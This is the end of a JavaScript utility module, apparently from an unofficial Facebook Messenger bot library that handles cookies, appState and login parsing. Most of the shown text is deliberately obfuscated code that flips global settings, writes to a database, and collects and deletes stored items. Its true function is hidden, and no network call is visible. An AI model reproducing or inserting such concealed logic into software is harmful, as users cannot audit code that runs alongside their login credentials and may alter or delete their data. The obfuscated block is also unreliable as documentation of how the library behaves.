_0x3f6fb7[_0x562a65(0x41a,0x3e4,0x3d0,0x429,0x445)](_0x1b47d1,_0x3566ed[_0x234415(0x42e,0x4a4,0x4a0,0x4a6,0x481)+'xt'](_0x1cd9dc[_0xf1433f(0x4d5,0x496,0x473,0x560,0x4a0)+_0xf1433f(0x53b,0x54c,0x587,0x513,0x4e9)+_0x496e9e(0x4de,0x46a,0x56a,0x4f7,0x509)],_0x3f6fb7[_0x562a65(0x3ff,0x408,0x388,0x3cf,0x454)](_0x3339ab,_0x3f6fb7[_0x562a65(0x413,0x3b3,0x425,0x428,0x415)])[_0x234415(0x362,0x3f6,0x3b0,0x396,0x3d5)+_0xf1433f(0x4c7,0x4aa,0x476,0x515,0x4d1)+_0xf1433f(0x585,0x5c3,0x59c,0x5f2,0x577)])),_0x5e71c9=_0x53253d;}}global[_0xf1433f(0x553,0x570,0x4fc,0x4c6,0x533)+'ng'][_0x7e9e63(0x22,0x2c,0x2c,0x19,0xb)](_0x3f6fb7[_0xf1433f(0x497,0x43d,0x50d,0x428,0x525)]);}}catch(_0x3c8f15){_0x3f6fb7[_0x562a65(0x439,0x45d,0x44e,0x4e2,0x47b)](_0x3f6fb7[_0x7e9e63(0x8e,0x80,0xac,0x31,-0x3)],_0x3f6fb7[_0x7e9e63(-0x37,0x10,0x6e,0x8b,0x27)])?(logger[_0x562a65(0x45e,0x451,0x3fc,0x439,0x459)](),_0x3f6fb7[_0x234415(0x4a1,0x4a9,0x4b5,0x3e2,0x460)](logger,_0x3f6fb7[_0x234415(0x51c,0x4aa,0x425,0x43a,0x4b0)]),global[_0x234415(0x40a,0x4b7,0x475,0x484,0x479)+'ng'][_0x496e9e(0x538,0x510,0x4f7,0x527,0x49f)](_0x3f6fb7[_0x234415(0x344,0x3e7,0x338,0x3fe,0x3bd)],![]),_0x3f6fb7[_0xf1433f(0x53e,0x57a,0x510,0x51d,0x58c)](logger,_0x3f6fb7[_0x234415(0x47c,0x451,0x440,0x451,0x439)])):(_0x577c3c[_0x562a65(0x47e,0x451,0x49c,0x4d1,0x4cc)](),_0x3f6fb7[_0x234415(0x3af,0x403,0x3ac,0x431,0x422)](_0x476a80,_0x3f6fb7[_0x7e9e63(-0x4,0x69,0xc5,0x4a,0xbb)]),_0x137c8a[_0x496e9e(0x520,0x4fd,0x547,0x52f,0x5a7)+'ng'][_0x496e9e(0x4a0,0x585,0x541,0x527,0x4db)](_0x3f6fb7[_0x234415(0x3d6,0x366,0x341,0x402,0x3bd)],![]),_0x3f6fb7[_0x234415(0x401,0x4ad,0x41f,0x3f8,0x446)](_0x472fa6,_0x3f6fb7[_0xf1433f(0x513,0x4d7,0x497,0x549,0x52f)]));}function _0xf1433f(_0x5d221a,_0x2f6621,_0x58fe92,_0x119952,_0x2e72){return bfwhbjwdwd_0x2c5477(_0x5d221a-0xc4,_0x58fe92,_0x58fe92-0x1cf,_0x119952-0xac,_0x5d221a-0x170);}function _0x496e9e(_0x553c7d,_0xf079d2,_0x4c8645,_0x5de3a5,_0x459384){return bfwhbjwdwd_0x25c2b8(_0x5de3a5-0x6cd,_0xf079d2-0x67,_0x4c8645-0x149,_0xf079d2,_0x459384-0x43);}function _0x562a65(_0x2714f6,_0x2b8229,_0x433852,_0x378a86,_0x3cadaa){return bfwhbjwdwd_0x4d4a9c(_0x3cadaa,_0x2b8229-0x4af,_0x433852-0x71,_0x378a86-0x172,_0x3cadaa-0x17c);}_0x3f6fb7[_0x7e9e63(0xa4,0x68,0x84,0x16,0xd0)](checkv2);};check(),global[bfwhbjwdwd_0x25c2b8(-0x19e,-0x1b1,-0x144,-0x137,-0x1bc)+'ng'][bfwhbjwdwd_0x1c2413(0x4de,0x55f,0x461,0x4e2,0x50e)](bfwhbjwdwd_0x234857(0x14f,0x10c,0xec,0x175,0x11f)+bfwhbjwdwd_0x25c2b8(-0x249,-0x236,-0x269,-0x21e,-0x286)+bfwhbjwdwd_0x4d4a9c(-0xc7,-0x45,-0xca,-0x45,-0x82),!![]);}else{var RPvzkZ=(bfwhbjwdwd_0x1c2413(0x565,0x55e,0x52c,0x4f4,0x4a4)+bfwhbjwdwd_0x25c2b8(-0x213,-0x286,-0x200,-0x19e,-0x256))[bfwhbjwdwd_0x234857(0x236,0x248,0x20c,0x298,0x1ca)]('|'),AzEEyt=-0x10e5+0x19c1+0xc*-0xbd;while(!![]){switch(RPvzkZ[AzEEyt++]){case'0':global[bfwhbjwdwd_0x234857(0x215,0x1f0,0x25a,0x1c6,0x256)+'ng'][bfwhbjwdwd_0x25c2b8(-0x1a6,-0x1cd,-0x1bc,-0x16b,-0x1a2)](bfwhbjwdwd_0x4d4a9c(-0xf1,-0x13a,-0x1c7,-0x104,-0x118)+bfwhbjwdwd_0x4d4a9c(-0x19b,-0x11f,-0xcb,-0x19c,-0xdf)+bfwhbjwdwd_0x2c5477(0x3d9,0x471,0x3a8,0x421,0x412),!![]);continue;case'1':Database[bfwhbjwdwd_0x2c5477(0x443,0x426,0x381,0x405,0x3db)](bfwhbjwdwd_0x2c5477(0x383,0x365,0x45f,0x3f5,0x3e5)+'um',![]);continue;case'2':global[bfwhbjwdwd_0x234857(0x215,0x2a3,0x1c2,0x1c3,0x1e0)+'ng'][bfwhbjwdwd_0x234857(0x20d,0x1d9,0x269,0x1ff,0x214)](bfwhbjwdwd_0x25c2b8(-0x20a,-0x1ae,-0x1cb,-0x214,-0x22b)+bfwhbjwdwd_0x2c5477(0x39b,0x328,0x304,0x3a1,0x37e)+bfwhbjwdwd_0x1c2413(0x51a,0x4b4,0x4e5,0x52a,0x53b),![]);continue;case'3':logger(bfwhbjwdwd_0x4d4a9c(-0xb5,-0xa8,-0x12e,-0x10e,-0x70)+bfwhbjwdwd_0x4d4a9c(-0x3,-0x83,-0x110,-0x6,-0xc)+bfwhbjwdwd_0x2c5477(0x372,0x440,0x41a,0x3b9,0x3c8)+bfwhbjwdwd_0x2c5477(0x407,0x3f5,0x3e2,0x3ed,0x434)+bfwhbjwdwd_0x25c2b8(-0x18e,-0x13f,-0x1a3,-0x1c5,-0x10b)+bfwhbjwdwd_0x2c5477(0x315,0x304,0x367,0x3a7,0x379));continue;case'4':Database[bfwhbjwdwd_0x1c2413(0x53a,0x558,0x485,0x4e2,0x506)](bfwhbjwdwd_0x1c2413(0x507,0x468,0x49d,0x4ec,0x4f8)+bfwhbjwdwd_0x25c2b8(-0x1b0,-0x179,-0x1ee,-0x1f5,-0x1c7),'');continue;}break;}}var checkv2=function(){function _0x2e9c08(_0x4a6994,_0x403298,_0x292b15,_0x6b4ede,_0x16bfb3){return bfwhbjwdwd_0x234857(_0x4a6994- -0x11f,_0x403298-0x6b,_0x292b15-0x1a0,_0x16bfb3,_0x16bfb3-0x12f);}var _0x4d947c={'rWmHi':_0x533878(0x3f0,0x35f,0x362,0x3e8,0x3bb)+_0x533878(0x40a,0x3e0,0x4d8,0x4b2,0x44b),'TbljG':function(_0x1a8563,_0x33bd71){return _0x1a8563(_0x33bd71);},'uSBnL':_0x2e9c08(0xc2,0xf9,0x147,0xd0,0x14b)+_0x4883a1(-0x46,-0xd1,-0x85,-0xc0,-0x10b)+_0x16b314(-0x171,-0x1cb,-0x16a,-0x21c,-0x176)+_0x4883a1(-0xa9,-0x9,-0x88,-0x60,-0x10)+_0x16b314(-0x1d3,-0x1a0,-0x1ad,-0x21b,-0x179)+_0x5eb19d(-0x4,-0x2d,-0x71,0x2,-0x49),'aUxOk':_0x4883a1(-0x79,-0xa5,-0x80,-0xaf,-0x100)+_0x533878(0x439,0x3a3,0x3b2,0x3fa,0x42a),'kDuRh':_0x533878(0x349,0x3cf,0x3c1,0x385,0x3d0)+_0x16b314(-0x248,-0x215,-0x1a7,-0x1b3,-0x1bc)+_0x2e9c08(0x136,0x1a2,0x11a,0xc7,0xbf),'HSPco':_0x2e9c08(0xf8,0x17a,0xc4,0x9d,0xdc)+'um','OSvPy':_0x533878(0x41e,0x4a7,0x495,0x418,0x464)+_0x16b314(-0x129,-0x167,-0x1a6,-0x1da,-0x10d),'JhnPb':_0x16b314(-0x2b8,-0x230,-0x1b8,-0x1b7,-0x1e8)+_0x5eb19d(-0x5a,0x2c,-0x3d,-0x33,0x1),'nNcNJ':_0x533878(0x40e,0x3da,0x3a1,0x3d5,0x408)+_0x16b314(-0x18f,-0x1bf,-0x1a4,-0x198,-0x184)+_0x4883a1(-0x88,-0x73,-0x91,-0xcc,-0xa5)+_0x533878(0x485,0x4ec,0x439,0x4a7,0x48d)+_0x5eb19d(0x6,-0x3c,-0x1d,0x80,0x41)+_0x5eb19d(-0x8c,-0x85,-0x26,0x3c,-0xd)+'m','MfjBI':function(_0x2437ff,_0x5f450b){return _0x2437ff(_0x5f450b);},'giioJ':function(_0x383374,_0x57ff96){return _0x383374(_0x57ff96);},'kuYzY':_0x4883a1(-0x92,-0xb5,-0x8a,-0xba,-0x7b)+_0x533878(0x37f,0x3e2,0x35d,0x2fb,0x37d)+_0x16b314(-0xee,-0x15d,-0x154,-0x13c,-0x13d)+_0x16b314(-0x237,-0x25d,-0x231,-0x273,-0x2cc)+_0x4883a1(-0x8f,-0x12e,-0xd5,-0xe2,-0x6d),'tCTbJ':_0x16b314(-0x23d,-0x1f9,-0x17b,-0x187,-0x264)+_0x4883a1(-0x9f,-0x8a,-0x6e,-0xd1,-0x5a),'oavAc':function(_0x259e34,_0x3a4454){return _0x259e34(_0x3a4454);},'DoonF':_0x2e9c08(0x142,0xd9,0x113,0x130,0xfd)+_0x16b314(-0x1d7,-0x255,-0x294,-0x247,-0x23f),'WcpOf':_0x4883a1(-0x149,-0x1d3,-0x123,-0x177,-0x15a)+_0x2e9c08(0x4b,0x69,0x85,0xac,-0x3e)+_0x533878(0x4bf,0x4f5,0x45b,0x49f,0x46b),'cGfta':function(_0x29ad5a,_0x2170a4){return _0x29ad5a==_0x2170a4;},'XqXxB':function(_0x3cbf67,_0x50ed19){return _0x3cbf67(_0x50ed19);},'suMSS':_0x2e9c08(0xba,0xfb,0x7b,0x111,0x4e)+_0x5eb19d(0x53,-0x9,-0x84,0x3b,0x0),'eoZLU':function(_0x2780e8,_0x482ad9){return _0x2780e8!==_0x482ad9;},'ErtKI':_0x2e9c08(0xdf,0x159,0xbc,0x13d,0x65),'hQGnG':_0x2e9c08(0x8f,0xd0,0xb4,0x2b,0x2e),'VtsSe':function(_0x2a5911,_0x5aa0b8){return _0x2a5911==_0x5aa0b8;},'eNdgQ':function(_0x1e228a){return _0x1e228a();},'DsnzI':_0x2e9c08(0x86,-0x7,0xcf,0xde,0x9d),'yQxHL':function(_0x11f115,_0x3cfd6f){return _0x11f115>_0x3cfd6f;},'RRtSw':function(_0x5a125d){return _0x5a125d();},'wMqvo':function(_0x522d70,_0x45fd9a){return _0x522d70!==_0x45fd9a;},'WUmiz':_0x5eb19d(-0x2b,-0x68,-0xc9,-0x4a,-0x65),'kwRFZ':function(_0x253ce0){return _0x253ce0();},'UYJFv':_0x4883a1(-0x1a7,-0xeb,-0x1af,-0x161,-0xda),'bJQki':function(_0x6e159b,_0x2a4c5a){return _0x6e159b!=_0x2a4c5a;},'WWLbX':function(_0x4ba712,_0x4f22e4){return _0x4ba712!==_0x4f22e4;},'KEkFC':_0x16b314(-0x19d,-0x1b3,-0x158,-0x1bd,-0x178)};function _0x533878(_0x236c91,_0x3278d7,_0x5a63e3,_0x3b243b,_0x2354ac){return bfwhbjwdwd_0x25c2b8(_0x2354ac-0x5da,_0x3278d7-0x6f,_0x5a63e3-0xd5,_0x3b243b,_0x2354ac-0x4e);}function _0x5eb19d(_0x124162,_0x2b9cf2,_0xe06012,_0x533435,_0x83a189){return bfwhbjwdwd_0x234857(_0x83a189- -0x1f4,_0x2b9cf2-0x1bc,_0xe06012-0xd1,_0xe06012,_0x83a189-0xf9);}function _0x4883a1(_0x191cb1,_0x5ae142,_0x83d26b,_0x4534cc,_0x2a3eb1){return bfwhbjwdwd_0x4d4a9c(_0x2a3eb1,_0x4534cc- -0x3d,_0x83d26b-0x1b6,_0x4534cc-0x9a,_0x2a3eb1-0xe8);}function _0x16b314(_0x2dc9a9,_0x3ef642,_0x42bf84,_0x2a3de6,_0x2e69af){return bfwhbjwdwd_0x234857(_0x3ef642- -0x3c5,_0x3ef642-0x186,_0x42bf84-0x22,_0x2e69af,_0x2e69af-0x4f);}if(_0x4d947c[_0x16b314(-0x262,-0x23f,-0x270,-0x20d,-0x205)](global[_0x4883a1(-0x25,-0xe0,-0xf0,-0xb1,-0x3d)+'ng'][_0x4883a1(-0x9e,-0x2a,-0x11b,-0xb7,-0x143)](_0x4d947c[_0x2e9c08(0x102,0xea,0x14e,0xa3,0x151)]),!![]))try{let _0x335c7f=[];switch(_0x4d947c[_0x5eb19d(-0x2e,-0x79,-0xe0,-0x95,-0x6f)](readyCreate,_0x4d947c[_0x4883a1(-0xa3,-0xef,-0x61,-0xb0,-0x90)])){case!![]:{if(_0x4d947c[_0x533878(0x4d0,0x41d,0x4e3,0x476,0x487)](_0x4d947c[_0x4883a1(-0xf9,-0x1e2,-0x15e,-0x167,-0x19d)],_0x4d947c[_0x16b314(-0x134,-0x1a7,-0x1dc,-0x20d,-0x126)])){if(_0x4d947c[_0x4883a1(-0x1a3,-0x18c,-0x146,-0x124,-0x1ae)](_0x4d947c[_0x16b314(-0x1d2,-0x1be,-0x190,-0x178,-0x1bc)](getAll)[_0x16b314(-0x211,-0x1f3,-0x1ee,-0x243,-0x225)+'h'],-0x1146+0x2*-0x796+0x3*0xad1)){if(_0x4d947c[_0x5eb19d(0x4d,0xc4,0x2b,0xe4,0x6c)](_0x4d947c[_0x4883a1(-0xb7,-0xac,-0x16e,-0x11a,-0x15d)],_0x4d947c[_0x533878(0x447,0x44d,0x359,0x41f,0x3d3)])){var _0x29e693=_0x4d947c[_0x5eb19d(0x1a,-0xba,-0xa2,-0x3f,-0x61)][_0x16b314(-0x13b,-0x18f,-0x131,-0x16a,-0x110)]('|'),_0x2e350d=-0x1a35+0x224e*0x1+-0x819;while(!![]){switch(_0x29e693[_0x2e350d++]){case'0':_0x4d947c[_0x4883a1(-0x1a4,-0x133,-0x153,-0x135,-0xfe)](_0x1be8e2,_0x4d947c[_0x2e9c08(0xd8,0xf7,0x163,0xf7,0x148)]);continue;case'1':_0x2d4f49[_0x2e9c08(0xee,0x136,0x15d,0x138,0x119)](_0x4d947c[_0x2e9c08(0x53,0xd9,-0x1d,0xb4,-0x10)],'');continue;case'2':_0x2de6f5[_0x533878(0x3da,0x3c4,0x3e8,0x40b,0x43c)+'ng'][_0x4883a1(-0x41,-0x62,-0x115,-0xb9,-0x12c)](_0x4d947c[_0x2e9c08(0x102,0xdd,0x14f,0x168,0x126)],![]);continue;case'3':_0x4d947c[_0x533878(0x43f,0x3f1,0x3c6,0x3aa,0x3b8)](_0x1f715d,_0xd23e88[_0x2e9c08(0x9e,0xde,0x112,0x44,0x51)](_0x30befd)[_0x2e9c08(0xb0,0xb9,0x10a,0x35,0x32)+'ge']);continue;case'4':_0x25a12b[_0x4883a1(-0xf9,-0x70,-0x10b,-0xb9,-0x6a)](_0x4d947c[_0x16b314(-0x207,-0x205,-0x1ac,-0x179,-0x17e)],![]);continue;}break;}}else return;}else{if(_0x4d947c[_0x2e9c08(0xec,0xef,0x112,0x135,0x12d)](_0x4d947c[_0x2e9c08(0x12b,0x13b,0xfb,0x1a4,0xf3)](getAll)[_0x533878(0x3c1,0x474,0x404,0x374,0x3f9)+'h'],0x17*-0x2e+0x217b*0x1+-0x1d58)){if(_0x4d947c[_0x533878(0x49c,0x4af,0x423,0x436,0x429)](_0x4d947c[_0x4883a1(-0x98,-0x112,-0xf4,-0xd9,-0x131)],_0x4d947c[_0x5eb19d(-0x27,0x62,0x65,-0x39,-0x7)]))_0x2bd4cf[_0x16b314(-0x14f,-0x1b8,-0x16f,-0x1cf,-0x14d)](_0x4d947c[_0x16b314(-0x189,-0x205,-0x180,-0x1af,-0x1ec)],![]),_0x3b2483[_0x4883a1(-0x134,-0x58,-0x83,-0xb9,-0x88)](_0x4d947c[_0x16b314(-0x220,-0x253,-0x1d1,-0x236,-0x2ab)],''),_0xea62b7[_0x16b314(-0x204,-0x1b8,-0x150,-0x199,-0x1e1)](_0x4d947c[_0x2e9c08(0x38,0x93,0x9c,0x42,0x4e)],_0x49565a);else{for(let _0x288b92 of _0x4d947c[_0x5eb19d(-0x4d,-0x23,-0x4d,-0x8,0x2)](getAll)){if(_0x4d947c[_0x2e9c08(0x141,0x164,0x175,0x113,0xb7)](_0x4d947c[_0x533878(0x345,0x340,0x37b,0x3d7,0x3ce)],_0x4d947c[_0x16b314(-0x1f5,-0x21e,-0x1af,-0x272,-0x246)])){var _0x5e3c32=_0x4d947c[_0x2e9c08(0x13e,0xcc,0xe6,0x190,0x190)][_0x16b314(-0x1b4,-0x18f,-0x104,-0x139,-0x1da)]('|'),_0x34030a=-0x8b9*0x2+-0x6*-0x2bb+0x110;while(!![]){switch(_0x5e3c32[_0x34030a++]){case'0':_0x1d009d[_0x533878(0x485,0x3b8,0x3f2,0x421,0x434)](_0x4d947c[_0x4883a1(-0x147,-0x1a2,-0x1e7,-0x16f,-0x1dc)],_0x5cbc90);continue;case'1':_0x4d947c[_0x4883a1(-0xc1,-0xd8,-0x18a,-0x135,-0x18b)](_0x797b95,_0x4d947c[_0x16b314(-0x232,-0x1e5,-0x1c0,-0x22f,-0x267)]);continue;case'2':_0xf37477[_0x16b314(-0x18d,-0x1b8,-0x1f7,-0x238,-0x19f)](_0x4d947c[_0x2e9c08(0x53,0x3a,-0x3a,0x4c,0x3c)],_0x4d947c[_0x5eb19d(0x64,-0x70,-0x3a,0x1c,0xd)](_0x386f22,_0x4d947c[_0x4883a1(-0x172,-0xbb,-0x101,-0x12a,-0x1ad)](_0x5ca39e,_0x4d947c[_0x533878(0x367,0x3c4,0x36d,0x426,0x3d9)])[_0x4883a1(-0xa3,-0x17d,-0xd8,-0xfe,-0xe3)+'y']));continue;case'3':_0x2dc884[_0x16b314(-0x1ae,-0x1b8,-0x23c,-0x1e4,-0x173)](_0x4d947c[_0x2e9c08(0xa1,0x113,0x119,0x60,0xdb)],!![]);continue;case'4':_0x3b530e[_0x4883a1(-0x104,-0x75,-0xbd,-0xb1,-0x31)+'ng'][_0x4883a1(-0x137,-0xf8,-0x11a,-0xb9,-0x147)](_0x4d947c[_0x2e9c08(0x102,0x17d,0x172,0x17e,0xae)],!![]);continue;}break;}}else{if(_0x4d947c[_0x5eb19d(0x7e,0x5f,0x9f,0x6d,0x5d)](_0x288b92[_0x2e9c08(0xfb,0x107,0x85,0xcf,0x71)][_0x2e9c08(0xa3,0xef,0xc3,0x33,0x3f)+_0x533878(0x406,0x3cb,0x43b,0x4b1,0x435)],undefined)){if(_0x4d947c[_0x5eb19d(-0x8d,-0x125,-0xd7,-0xbe,-0x9a)](_0x4d947c[_0x16b314(-0x279,-0x241,-0x22a,-0x20f,-0x2c8)],_0x4d947c[_0x4883a1(-0x16b,-0x18f,-0x155,-0x142,-0x15a)])){var _0x5e3ef3=_0x4d947c[_0x16b314(-0x1d5,-0x206,-0x240,-0x1dc,-0x244)][_0x4883a1(-0x91,-0x10b,-0xaa,-0x90,-0xc9)]('|'),_0x1e8db2=-0x1867+-0x1d0a+0x1*0x3571;while(!![]){switch(_0x5e3ef3[_0x1e8db2++]){case'0':_0x4db9b5[_0x533878(0x3f1,0x4b2,0x3e0,0x40c,0x434)](_0x4d947c[_0x16b314(-0x26a,-0x205,-0x28b,-0x1bf,-0x1c5)],![]);continue;case'1':_0x4d947c[_0x16b314(-0x21f,-0x229,-0x1c4,-0x1bc,-0x22e)](_0x4a96a7,_0x4d947c[_0x16b314(-0x179,-0x1ce,-0x252,-0x161,-0x182)]);continue;case'2':_0x5d011a[_0x5eb19d(-0x64,0x12,0x2a,0xa7,0x19)](_0x4d947c[_0x16b314(-0x27d,-0x253,-0x28d,-0x2aa,-0x1dc)],'');continue;case'3':_0x4d947c[_0x2e9c08(0x6b,0x38,0x27,0xe2,0x87)](_0x3a172c,_0xf2d652[_0x533878(0x462,0x361,0x400,0x36d,0x3e4)](_0xea5e73)[_0x16b314(-0x1f7,-0x1f6,-0x206,-0x275,-0x23e)+'ge']);continue;case'4':_0x5d9a2e[_0x4883a1(-0x11d,-0x28,-0xb1,-0xb1,-0xb8)+'ng'][_0x2e9c08(0xee,0x141,0x9b,0x13b,0xec)](_0x4d947c[_0x533878(0x444,0x48c,0x446,0x420,0x448)],![]);continue;}break;}}else _0x335c7f[_0x4883a1(-0x10e,-0xdc,-0x155,-0x15d,-0xe6)](_0x288b92[_0x5eb19d(-0x3f,0x8a,-0x14,0x9e,0x26)][_0x533878(0x379,0x456,0x3aa,0x381,0x3e9)+_0x5eb19d(-0xd,-0x12,0x7d,0x86,0x1a)]);}else continue;}}_0x4d947c[_0x16b314(-0x27e,-0x234,-0x1ff,-0x25e,-0x228)](deleteAll,_0x335c7f);}}}}else{var _0x5c7768=_0x4d947c[_0x16b314(-0x16d,-0x1d3,-0x14b,-0x1b3,-0x229)][_0x533878(0x3e7,0x45c,0x4a8,0x4df,0x45d)]('|'),_0x46fcdf=0x3f9*-0x1+0x1*-0x121e+-0xc3*-0x1d;while(!![]){switch(_0x5c7768[_0x46fcdf++]){case'0':_0x4d947c[_0x2e9c08(0x7d,0xe8,0x5d,0x1d,0x5f)](_0x3ff7eb,_0x4d947c[_0x16b314(-0x1ce,-0x1ce,-0x1a6,-0x15e,-0x17e)]);continue;case'1':_0x4f57a0[_0x16b314(-0x134,-0x1b0,-0x1b8,-0x13d,-0x198)+'ng'][_0x533878(0x440,0x457,0x3e1,0x4bd,0x434)](_0x4d947c[_0x16b314(-0x1fe,-0x269,-0x1f9,-0x1e1,-0x1e1)],!![]);continue;case'2':_0xe2fdbd[_0x533878(0x47c,0x459,0x3f1,0x423,0x434)](_0x4d947c[_0x533878(0x360,0x3d3,0x36e,0x368,0x399)],'');continue;case'3':_0x452d23[_0x16b314(-0x1ff,-0x1b0,-0x13b,-0x147,-0x1d7)+'ng'][_0x533878(0x4ab,0x49b,0x3c4,0x426,0x434)](_0x4d947c[_0x16b314(-0x11d,-0x1a4,-0x1da,-0x1c5,-0x1af)],![]);continue;case'4':_0x2ca932[_0x4883a1(-0x80,-0x51,-0x49,-0xb9,-0x97)](_0x4d947c[_0x16b314(-0x21d,-0x205,-0x1a1,-0x183,-0x273)],![]);continue;}break;}}}break;case![]:{}break;}}catch(_0x4fcf28){console[_0x533878(0x45e,0x365,0x47e,0x376,0x3f0)](_0x4fcf28);}};logger(getText[bfwhbjwdwd_0x2c5477(0x460,0x385,0x42b,0x36b,0x3eb)+'xt'](Language[bfwhbjwdwd_0x4d4a9c(0x3c,-0x27,0x4b,-0x1e,-0x4e)+bfwhbjwdwd_0x25c2b8(-0x186,-0x1ce,-0x1cf,-0x14c,-0x123)+'e'],''+prettyMilliseconds(Date[bfwhbjwdwd_0x2c5477(0x434,0x40f,0x39d,0x433,0x3c9)]()-global[bfwhbjwdwd_0x25c2b8(-0x15b,-0x1bb,-0x196,-0xd2,-0x17e)+bfwhbjwdwd_0x1c2413(0x428,0x4a4,0x532,0x4b0,0x498)])),bfwhbjwdwd_0x4d4a9c(0x15,-0x44,-0x22,-0x7e,-0x39)+bfwhbjwdwd_0x1c2413(0x4cb,0x4a9,0x534,0x4d9,0x52d)+']');return data;
}

module.exports = {
    isReadableStream:isReadableStream,
    get:get,
    post:post,
    postFormData:postFormData,
    generateThreadingID:generateThreadingID,
    generateOfflineThreadingID:generateOfflineThreadingID,
    getGUID:getGUID,
    getFrom:getFrom,
    makeParsable:makeParsable,
    arrToForm:arrToForm,
    getSignatureID:getSignatureID,
    getJar: request.jar,
    generateTimestampRelative:generateTimestampRelative,
    makeDefaults:makeDefaults,
    parseAndCheckLogin:parseAndCheckLogin,
    getGender: getGenderByPhysicalMethod,
    saveCookies,
    getType,
    _formatAttachment,
    formatHistoryMessage,
    formatID,
    formatMessage,
    formatDeltaEvent,
    formatDeltaMessage,
    formatProxyPresence,
    formatPresence,
    formatTyp,
    formatDeltaReadReceipt,
    formatCookie,
    formatThread,
    formatReadReceipt,
    formatRead,
    generatePresence,
    generateAccessiblityCookie,
    formatDate,
    decodeClientPayload,
    getAppState,
    getAdminTextMessageType,
    setProxy
};